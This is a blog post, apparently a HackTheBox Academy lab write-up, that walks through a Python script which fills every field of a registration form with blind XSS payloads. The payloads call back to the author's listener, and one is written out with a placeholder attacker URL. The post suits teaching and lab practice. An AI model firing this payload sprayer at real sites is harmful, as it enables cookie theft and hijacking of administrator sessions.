---
layout: post
title: Creating a Blind XSS Script for HackTheBox
description: A look into my Python script that submits blind requests into a web server
summary: A look into my Python script that submits blind requests into a web server.
tags: xss blind-xss hackthebox-academy
minute: 1
---

Table of Contents
- [What is Cross-Site Scripting?](#what-is-cross-site-scripting)
- [Target Overview](#target-overview)
- [The Solution](#the-solution)
    - [Importing Libraries](#importing-libraries)
    - [Defining Main Functions](#defining-main-functions)
    - [The Result](#the-result)
- [Conclusion](#conclusion)
# Overview
Earlier this year, I created a Python script for the sole purpose of finding whether or not this registration form was vulnerable to cross-site scripting. This web application was hosted on HackTheBox's Academy module and did not automatically sign you up but rather has an 'admin' check your information. You can obviously do this manually, but since this is not an actual production environment and modifying payloads can be quite tedious, I thought, "Why not make a script for this?"

>Just to note, this is an updated version of the previous script. It's still by no means perfect, but it is quite perfect for this specific context. I will update this post as needed.

## What is Cross-Site-Scripting?
Cross-site scripting (xss for short) is a web application vulnerability that allows an attacker to have the ability to execute malicious HTML and JavaScript. The impact is trivial, but depending on the context, the attacker can obtain session cookies and log in to victim accounts. This is particularly dangerous if they were to obtain an administrator's session cookie.

# Target Overview
We are presented a registration form with five input fields:
- username
- password
- full name
- image url
- email

When we submit random but reasonable data and register, we are met with this message:
![registered](/assets/htb/thanks.jpg)

This implies that an admin, most likely logged in to an administrator account, will process and read our information. This leaves us to now find which input field(s) will be vulnerable to an XSS attack.

# The Solution
## Importing Libraries
Since this registration form processes user information through GET requests, I will need the `re` library for regular expressions. `urllib3` will also ignore any warnings when executing the script.

{% highlight python %}
import sys
import requests
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
{% endhighlight %}

## Defining Main Functions
Here I didn't want make the main function too complicated and wanted to have the options be more intuitive. This takes the argument that the user will supply and stores it into the `url` variable. Then we call the `stage()` function to get everything setup.
{% highlight python %}
def main():
	# Take in target URL, target input fields, actual number of input fields
	if len(sys.argv) != 2:
		print('[-] Usage: %s "<url>"' % sys.argv[0])
		print('[-] Example: %s "www.example.com"' % sys.argv[0])
		sys.exit(-1)

	url = sys.argv[1]
	stage()

if __name__ == '__main__':
	main()
{% endhighlight %}

To kickoff the `stage()` function, we're asking the user for the registration request by pasting in the URL with the parameters since this particular application is doing so by a GET request.

Next we're finding the parameters that are included in the URL as well as the target domain. The goal is to later add these parameters to the `data` dictionary with the right values.
{% highlight python %}
def stage():
	input_url = str(input('Paste URL with parameters: '))

	# REGEX patterns to find target and parameters
	pattern_params = r"[?&]([^?&]+)="
	pattern_target = r"\/\/([^\/]+)"
	found_target = re.search(pattern_target, input_url)
	found_params = re.findall(pattern_params, input_url)
	data = {}

    url = "http://" + found_target.group(1) + "/hijacking/"
{% endhighlight %}
>I do see that the `url` variable line is a bit off. This is because my regex is very weak and at the time I couldn't wrap my head around how to get the string that I wanted. I will update that in the future.

This next section is what I was referring to as having the tool to be more  'intuitive'. Not all input fields will be able to handle HTML tags, and in this case, the `email` input field will not. So I wanted to provide the option to get rid of that parameter from being tested for XSS, but still have the right data in the request so that it can be processed correctly.
{% highlight python %}
user_select = int(input('If any of these parameters are not vulnerable, please select the corresponding number: '))
	for i in range(len(found_params)):
		if user_select == (i):
			j = user_select - 1
			value = str(input('Please provide a valid value for this parameter: '))
			popped = found_params.pop(j)
			data[popped] = value
			break
	remote = str(input('Enter in your remote IP address:'))
	for param in found_params:
		data[param] = ''
{% endhighlight %}

This is the last part of the script. With the script comes with a text file called `payload-template.txt`. This is just a few payloads taken from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). Each line has unique way of breaking the HTML code to perform a XSS and submits a request to a remote server hosted by us. Here's what one looks like: `'><script src=http://<URL_HERE>/<PARAM>></script>`. We don't necessarily have to host the file ourselves. When that request is made, we will see it in our logs as to what input field executed our payload.

We start by opening the text file, and begin a `for` loop. This loop will iterate each line and add it to the `payload` variable. Inside the same loop, there's a nested `for` loop that iterates through each parameter that we found earlier in the function and performs string formatting by replacing the placeholder values in the text with our data. Then we submit the request and let the user know.
{% highlight python %}
	fp = open('payload-template.txt', 'r')
	for line in fp:
		payload = line.strip('\n')
		for param in found_params:
			data[param] = payload.replace('<URL_HERE>', remote).replace('<PARAM', param)
		r = requests.post(url, verify=False, params=data)
		print('[+] Submitting payload.')

	print('[+] All payloads have been submitted. Please check your listener for responses.')
{% endhighlight %}

## The Result
![gif](/assets/htb/blindxss-2.gif)


# Conclusion
And there we have it. When running the script, we also want to make sure to host a web server. This can be done with Python, Apache, or PHP. 

Now to reflect on the quality of the script ; I will admit it's not perfect, but it's still far better than the first iteration. The only thing that I would need to change up is the initial regular expressions and clean up the output of the tool. One thing I did not include in this iteration is printing `r.url`, which prints out the GET request that was submitted. This would tell the user which payload worked. 

<div class="badgeHeader">
    <div class="badgeContainer">
        <script src="https://www.hackthebox.com/badge/image/705235"></script>
    </div>
</div>